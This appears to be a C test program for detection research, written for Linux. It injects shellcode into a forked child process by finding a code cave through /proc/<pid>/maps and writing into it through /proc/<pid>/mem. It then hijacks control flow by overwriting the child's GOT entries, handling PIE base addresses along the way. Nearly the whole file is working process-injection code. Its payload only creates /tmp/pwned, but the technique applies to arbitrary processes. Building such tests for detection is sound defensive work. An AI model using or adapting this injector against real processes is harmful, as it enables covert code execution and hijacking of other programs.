#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <ctype.h>
#include <elf.h>

unsigned char shellcode[] = {
    0x48, 0x83, 0xe4, 0xf0,        // and rsp, -16        (stack alignment)
    0xeb, 0x26,                    // jmp short get_path
    // --- back: ---
    0x5f,                          // pop rdi
    0xb8, 0x02, 0x00, 0x00, 0x00,  // mov rax, 2          (open)
    0xbe, 0x41, 0x00, 0x00, 0x00,  // mov esi, 0x41       (O_CREAT|O_WRONLY)
    0xba, 0xa4, 0x01, 0x00, 0x00,  // mov edx, 0x1a4      (0644)
    0x0f, 0x05,                    // syscall
    0x48, 0x89, 0xc7,              // mov rdi, rax        (fd)
    0xb8, 0x03, 0x00, 0x00, 0x00,  // mov rax, 3          (close)
    0x0f, 0x05,                    // syscall
    0xb8, 0x3c, 0x00, 0x00, 0x00,  // mov rax, 60         (exit)
    0x48, 0x31, 0xff,              // xor rdi, rdi
    0x0f, 0x05,                    // syscall
    // --- get_path: ---
    0xe8, 0xd5, 0xff, 0xff, 0xff,  // call back
    0x2f, 0x74, 0x6d, 0x70, 0x2f,  // "/tmp/"
    0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
    0x00                          
};
unsigned int shellcode_len = sizeof(shellcode);

#define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
#define MIN(a, b) (((a) < (b)) ? (a) : (b))

pid_t create_victim_child_process() {
    pid_t pid = fork();
    if (pid < 0) {
        return 0;
    } else if (pid == 0) {
        sleep(2);
        printf("look for printf address in the GOT table, and this printf call will be hijacked: control will jump to the shellcode instead ;)\n");
        exit(0);
    }
    usleep(200000);
    return pid;
}

ssize_t write_in_mem(long addr, pid_t pid, unsigned char *buffer, size_t len) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);

    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;

    if (lseek(fd, (off_t)addr, SEEK_SET) == (off_t)-1) {
        close(fd);
        return -2;
    }

    ssize_t ret = write(fd, buffer, len);

    close(fd);
    return ret;
}

int read_mem(void *buf, pid_t pid, uintptr_t address, size_t len) {
    char filepath[256];
    snprintf(filepath, sizeof(filepath), "/proc/%d/mem", pid);

    FILE *file = fopen(filepath, "r");
    if (!file) return -1;

    if (fseeko(file, (off_t)address, SEEK_SET) != 0) {
        fclose(file);
        return -2;
    }

    if (fread(buf, 1, len, file) != len) {
        fclose(file);
        return -3;
    }

    fclose(file);
    return 0;
}

void print_mem(unsigned char* buffer, long size) {
    for (size_t i = 0; i < size; i += 16) {
        printf("%06zx  ", i);
        for (size_t j = 0; j < 16; j++) {
            if (i + j < size)
                printf("%02x ", buffer[i + j]);
            else
                printf("   ");
            if (j == 7) printf(" ");
        }
        printf("\n");
    }
}

long find_code_cave(pid_t pid, size_t shellcode_len) {
    char maps_path[256];
    char mem_path[256];
    
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_path, "r");
    int mem_fd = open(mem_path, O_RDONLY);

    if (!maps_file || mem_fd < 0) {
        if (maps_file) fclose(maps_file);
        if (mem_fd >= 0) close(mem_fd);
        return -1;
    }

    char line[512];
    long start_addr, end_addr;
    char perms[5];
    unsigned char *buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(maps_file);
        close(mem_fd);
        return -1;
    }

    while (fgets(line, sizeof(line), maps_file)) {
         
        if (sscanf(line, "%lx-%lx %4s", &start_addr, &end_addr, perms) != 3)
            continue;
        
        //has the region execute permission?
        if (strchr(perms, 'x') == NULL)
            continue;

        // read the region dividing it in chunks
        if (lseek(mem_fd, start_addr, SEEK_SET) == (off_t)-1)
            continue;
        long current_addr = start_addr;
        size_t consecutive_zeros = 0;
        while (current_addr < end_addr) {

            size_t bytes_to_read = end_addr - current_addr;
            bytes_to_read = MIN(bytes_to_read, CHUNK_SIZE);
            ssize_t bytes_read = read(mem_fd, buffer, bytes_to_read);
            if (bytes_read <= 0) break;
            
            // look for consecutives 0x00
            for (ssize_t i = 0; i < bytes_read; i++) {
                if (buffer[i] == 0x00) {
                    consecutive_zeros++;
                    
                    if (consecutive_zeros >= shellcode_len) {
                        long cave_addr = current_addr + i - shellcode_len + 1;

                        fclose(maps_file);
                        close(mem_fd);
                        free(buffer);
                        return cave_addr; 
                    }
                } else {
                    consecutive_zeros = 0;
                }
            }
            current_addr += bytes_read;
        }
    }
    
    fclose(maps_file);
    close(mem_fd);
    free(buffer);
    return -1;
}

long get_base_address(pid_t pid) {
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    
    FILE *f = fopen(path, "r");
    if (!f) return -1;
    
    char line[512];
    long base_address = -1;
    
    // On x86-64 Linux the first entry in /proc/<pid>/maps is reliably the binary's base address
    if (fgets(line, sizeof(line), f)) {
        sscanf(line, "%lx-", &base_address);
    }
    
    fclose(f);
    return base_address;
}

long get_got(pid_t pid, long *got_size){
    char exe_path[256];
    snprintf(exe_path, sizeof(exe_path), "/proc/%d/exe", pid);
    
    int fd = open(exe_path, O_RDONLY);
    if (fd < 0) return -1;

    Elf64_Ehdr ehdr; // get headers of raw file -> ehdr
    if (read(fd, &ehdr, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
        close(fd);
        return -1;
    }

    // verifying it's an ELF
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        close(fd);
        return -1;
    }

    Elf64_Shdr shstrtab_hdr;
    // go to Section Header String Table in the section header table
    if(lseek(fd, ehdr.e_shoff + (ehdr.e_shstrndx * sizeof(Elf64_Shdr)), SEEK_SET) == -1){
        close(fd);
        return -1;
    } // read Section Header String Table -> shstrtab_hdr
    if(read(fd, &shstrtab_hdr, sizeof(Elf64_Shdr)) != sizeof(Elf64_Shdr)){
        close(fd);
        return -1;
    }

    char *shstrtab = malloc(shstrtab_hdr.sh_size);
    if(!shstrtab){
        close(fd);
        return -1;
    } // go to String Table Content
    if(lseek(fd, shstrtab_hdr.sh_offset, SEEK_SET) == -1){
        free(shstrtab);
        close(fd);
        return -1;
    } // read String Table Content -> shstrtab
    if(read(fd, shstrtab, shstrtab_hdr.sh_size) != (ssize_t)shstrtab_hdr.sh_size){
        free(shstrtab);
        close(fd);
        return -1;
    }

    long got_addr = -1;

    // looking for ".got.plt" to gather its address
    for (int i = 0; i < ehdr.e_shnum; i++) {
        Elf64_Shdr shdr;
        if(lseek(fd, ehdr.e_shoff + (i * sizeof(Elf64_Shdr)), SEEK_SET) == -1){
            free(shstrtab);
            close(fd);
            return -1;
        }
        if(read(fd, &shdr, sizeof(Elf64_Shdr)) != sizeof(Elf64_Shdr)){
            free(shstrtab);
            close(fd);
            return -1;
        }

        char *section_name = shstrtab + shdr.sh_name;
        if (strcmp(section_name, ".got") == 0) {
            *got_size = shdr.sh_size;
            got_addr = shdr.sh_addr;
        }
        if (strcmp(section_name, ".got.plt") == 0) {
            *got_size = shdr.sh_size; //we'll need the size later
            got_addr = shdr.sh_addr;
            break;
        }
    }

    free(shstrtab);
    close(fd);
    if (got_addr == -1) return -1;

    // in case of PIE (Position Independent Executable)
    if (ehdr.e_type == ET_DYN) {
        long base_addr = get_base_address(pid);
        if (base_addr == -1) return -1;
        got_addr += base_addr;
    }

    return got_addr;
}


int main(int argc, char *argv[]) {
    pid_t pid = create_victim_child_process();
    if (pid == 0) {
        fprintf(stderr, "[-] Failed to fork\n");
        exit(1);
    }
    printf("[+] target PID: %d\n", pid);

    long target_address = find_code_cave(pid, shellcode_len);
    if (target_address == -1) {
        fprintf(stderr, "[-] Code cave not found\n");
        exit(1);
    }
    printf("[+] Code cave found at: 0x%lx\n", target_address);

    // write the payload in a executable region
    unsigned char CodeCave[shellcode_len];
    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0)
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] Code Cave content before the overwrite: \n");
    print_mem(CodeCave, shellcode_len);

    if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
        fprintf(stderr, "[-] Failed to write payload into code cave\n");
        exit(1);
    }
    printf("[+] Payload written successfully\n");

    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0)
        fprintf(stderr, "[!] Warning: failed to read memory\n");
    printf("[+] Code Cave content after the overwrite: \n");
    print_mem(CodeCave, shellcode_len);
    
    // Parse the ELF headers via /proc/<pid>/exe to locate .got.plt
    // (and /proc/<pid>/maps to get the load base for PIE binaries)
    long got_size = 0;
    long got_address = get_got(pid, &got_size);
    if (got_address == -1) {
        fprintf(stderr, "[-] Failed to locate GOT section\n");
        exit(1);
    }
    printf("[+] GOT found at: 0x%lx (size: %ld)\n", got_address, got_size);

    unsigned char *GOTcontent = malloc(got_size);
    if (!GOTcontent) {
        fprintf(stderr, "[!] Warning: malloc failed, skipping dump\n");
    } else {
        if (read_mem(GOTcontent, pid, got_address, got_size) != 0) 
            fprintf(stderr, "[!] Warning: failed to read memory\n");
        printf("[+] GOT content before the overwrite: \n");
        print_mem(GOTcontent, got_size);
    }
    
	//Overwrite addresses of library functions with the address of our payload
    /* except for the first 3 entries:
    GOT[0]: address of the .dynamic section.                                +0
    GOT[1]: pointer to the link_map structure.                              +8
    GOT[2]: pointer to the dynamic linker's _dl_runtime_resolve function.   +16
    GOT[3]: pointer to the first dynamically imported library function.     +24
    ...
    */

    long start_offset = 24;
    long bytes_to_write = got_size - start_offset;
    int num_entries = bytes_to_write / sizeof(long);

    long *buffer = (long *)malloc(bytes_to_write);
    if (!buffer) {
        free(GOTcontent);
        fprintf(stderr, "[-] Malloc failed\n");
        exit(1);
    }

    for (int i = 0; i < num_entries; i++) buffer[i] = target_address;
    
    ssize_t ret = write_in_mem(got_address + start_offset, pid, (unsigned char *)buffer, bytes_to_write);
    free(buffer);

    if (ret != (ssize_t)bytes_to_write) {
        fprintf(stderr, "[-] Failed to overwrite GOT\n");
        exit(1);
    }
    printf("[+] Successfully overwritten %d GOT entries\n", num_entries);

    if (GOTcontent) {
        if (read_mem(GOTcontent, pid, got_address, got_size) != 0)
            fprintf(stderr, "[!] Warning: failed to read memory\n");
        printf("[+] GOT content after the overwrite:\n");
        print_mem(GOTcontent, got_size);
    }

    printf("[+] Injection finished\n");
    free(GOTcontent);
    exit(0);
}

/**
 * This technique identifies a code cave by scanning /proc/<pid>/maps
 * and writes the shellcode into it through /proc/<pid>/mem.
 * To redirect the execution flow, it parses the target's ELF structure through /proc/<pid>/exe
 * to locate the Global Offset Table (.got.plt) and calculates the absolute addresses for PIE-enabled binaries.
 * By overwriting these GOT entries with the shellcode’s address,
 * the injector ensures that the next time the victim calls a dynamic library function,
 * it will inadvertently execute the injected payload instead.
 * 
 * get_got:
 * Locates the Global Offset Table (.got.plt), which is an array of pointers 
 * the program uses to dynamically find external library functions.
 * - Finds the string table (shstrtab) containing the names of all sections.
 * - Searches for the section named ".got.plt", extracting its address and size.
 * - PIE Handling: If the executable is dynamic (ET_DYN / PIE), the found 
 * address is just a relative offset. It must be added to the base_address 
 * (found before) to get the absolute RAM address.
 * 
 * Note: this test forks a child process to use as the injection target.
 * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
 * where a process can only modify the memory of its own descendants.
 * This may differ from a real-world scenario where the attacker targets an arbitrary process,
 * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/<pid>/mem
 * access patterns are generated regardless of the relationship between injector and target.
 * 
 * Injection inspired by Ori David in "The Definitive Guide to Linux Process Injection"
 * https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection
 * 
 */
